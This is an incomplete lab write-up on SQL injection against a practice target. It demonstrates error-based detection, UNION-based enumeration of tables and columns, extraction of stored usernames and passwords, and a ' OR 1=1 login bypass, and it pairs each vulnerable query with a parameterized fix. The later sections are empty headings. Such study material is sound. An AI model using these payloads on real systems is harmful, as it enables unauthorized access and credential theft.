
Write-up in progress...


# SQL Injection (SQLi)

SQL Injection is a web application vulnerability that occurs when user input is directly included in SQL queries without proper sanitization or parameterization.

This allows an attacker to manipulate database queries and potentially access, modify or delete sensitive data.

---

# 1. Introduction

SQL Injection (SQLi) happens when an application fails to properly validate user input before using it in a SQL query.

## Why it happens

- Unsanitized user input is concatenated into SQL queries
- Lack of parameterized queries (prepared statements)
- Trusting client-side input

## Impact

SQL Injection can allow attackers to:

- Bypass authentication
- Extract sensitive data (users, passwords, etc.)
- Modify or delete database records
- In some cases, achieve remote code execution (RCE)

---

# 2. In-Band SQL Injection

In-Band SQL Injection is a type of SQL Injection where both the exploitation and data retrieval occur through the same communication channel (e.g., HTTP response).

This makes it one of the easiest types of SQL Injection to detect and exploit.

It is commonly divided into:

- Error-Based SQL Injection
- Union-Based SQL Injection

---

## 2.1 Error-Based SQL Injection

Error-based SQL Injection relies on forcing the database to return error messages that reveal information about its structure.

---

### Detection

The vulnerability was identified in the `id` parameter of the following endpoint:

```
https://website.thm/article?id=1
```

To test for SQL Injection, a single quote (`'`) was injected into the parameter:

```
https://website.thm/article?id=1'
```

This caused a database error, confirming that the input is directly included in a SQL query without proper sanitization.

---

### Evidence

![SQL error when injecting single quote](images/sqli_error_id_param_1_quote.png)

The application returns a SQL syntax error when malformed input is provided.

---

### Explanation

The error occurs because the application concatenates user input directly into an SQL query. When the query structure is broken using special characters (such as `'`), the database returns an error message that leaks internal information.

This confirms the existence of an Error-Based SQL Injection vulnerability.

---

### Security Impact

Error messages from the database can expose internal structure and help attackers enumerate the database schema.

---
## 2.2 Union-Based SQL Injection

Union-Based SQL Injection allows an attacker to combine the results of two SQL queries using the `UNION` operator. This technique is commonly used to extract data directly from the database.

---

### Identifying the number of columns

To successfully use `UNION SELECT`, the number of columns in the original query must match the injected query.

Different payloads were tested:

```sql
?id=1 UNION SELECT 1
?id=1 UNION SELECT 1,2
?id=1 UNION SELECT 1,2,3
```

The correct number of columns was identified as **3**, as the query stopped returning errors at this stage.

![UNION SELECT column enumeration](images/sqli_union_column-enumeration.png)

---

### Forcing output display

By default, the application displays the first result of the original query. To overwrite this behavior, the original query result was neutralized:

```sql
0 UNION SELECT 1,2,3
```

This allowed the injected values to be displayed directly in the response.

![Controlled UNION SELECT output](images/sqli_union_output-control.png)

---

### Extracting database name

The database name was retrieved using the built-in SQL function `database()`:

```sql
0 UNION SELECT 1,2,database()
```

This revealed the active database being used by the application.

![Database name extraction](images/sqli_union_database-name.png)

---

### Enumerating database tables

The `information_schema` database was used to retrieve table names:

```sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one'
```

This query lists all tables accessible in the current database schema.

Result included tables such as:
- article
- staff_users

![Database table enumeration](images/sqli_union_table-enumeration.png)

---

### Enumerating columns

Once the relevant table (`staff_users`) was identified, its structure was enumerated:

```sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'staff_users'
```

This revealed the following columns:
- id
- username
- password

![Column enumeration from staff_users table](images/sqli_union_column-enumeration_staff-users.png)

---

### Extracting credentials

Finally, user credentials were extracted using concatenation techniques:

```sql
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users
```

This returned all usernames and passwords stored in the table.

![Credential extraction from staff_users table](images/sqli_union_credential-extraction.png)

---

### Why this works

The vulnerability exists because the application directly concatenates user-controlled input into SQL queries without proper sanitization or parameterization.

As a result, attackers can manipulate the structure of the original query and inject additional SQL statements such as `UNION SELECT`.

--- 

### Vulnerable query example

```sql
SELECT title, description, author
FROM articles
WHERE id = '$id';
```

If user input is not sanitized, attackers can inject arbitrary SQL statements into the query.

---

### Secure implementation

Parameterized queries (prepared statements) should be used instead of dynamically building SQL queries.

Example:

```python
query = "SELECT title, description, author FROM articles WHERE id = %s"
cursor.execute(query, (user_input,))
```

This ensures that user input is treated strictly as data rather than executable SQL syntax.

---

# 3. Blind SQL Injection – Authentication Bypass

Blind SQL Injection occurs when the application does not directly return database errors or query results to the user.

Even without visible feedback, it is still possible to manipulate SQL queries and infer whether an injection attempt was successful based on the application's behavior.

---

## Authentication Bypass

One of the most common uses of Blind SQL Injection is bypassing authentication mechanisms such as login forms.

In these scenarios, the objective is not to extract data directly from the database, but rather to manipulate the application's authentication logic to gain unauthorized access.

---

### Original query structure

The login form sends user-controlled input to the following SQL query:

```sql
SELECT * FROM users
WHERE username='%username%'
AND password='%password%'
LIMIT 1;
```

The application checks whether the query returns a valid user record.

If the query returns `TRUE`, access is granted.

---

### SQL Injection payload

The following payload was injected into the password field:

```sql
' OR 1=1;--
```

This modifies the SQL query into:

```sql
SELECT * FROM users
WHERE username=''
AND password=''
OR 1=1;
```

Because `1=1` always evaluates to `TRUE`, the query returns a valid result regardless of the supplied credentials.

As a result, the authentication check is bypassed.

![Authentication bypass using OR 1=1](images/sqli_blind_login-payload.png)

![Authentication bypass success](images/sqli_blind_authentication-bypass-success.png)

---

### Why this works

The vulnerability exists because user-controlled input is directly concatenated into the SQL query without proper validation or parameterization.

The injected payload alters the logic of the original query by introducing a condition that always evaluates to `TRUE`.

This causes the database to return a successful authentication result even when invalid credentials are supplied.

---

### Vulnerable query example

```python
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

In this implementation, attackers can manipulate the SQL query structure by injecting SQL syntax into the input fields.

---

### Secure implementation

Authentication queries should use parameterized statements instead of directly concatenating user input.

Example:

```python
query = "SELECT * FROM users WHERE username=%s AND password=%s"
cursor.execute(query, (username, password))
```

This prevents user input from being interpreted as executable SQL code.

---

### Security Impact

Authentication bypass vulnerabilities can allow attackers to:

- Access restricted areas of the application
- Impersonate legitimate users
- Escalate privileges
- Gain unauthorized access to sensitive data

---

# 4. Blind SQL Injection – Boolean-Based


---

# 5. Blind SQL Injection – Time-Based

---

# 6. Out-of-Band SQL Injection

---

# 7. Impact of SQL Injection

---

# 8. Mitigations


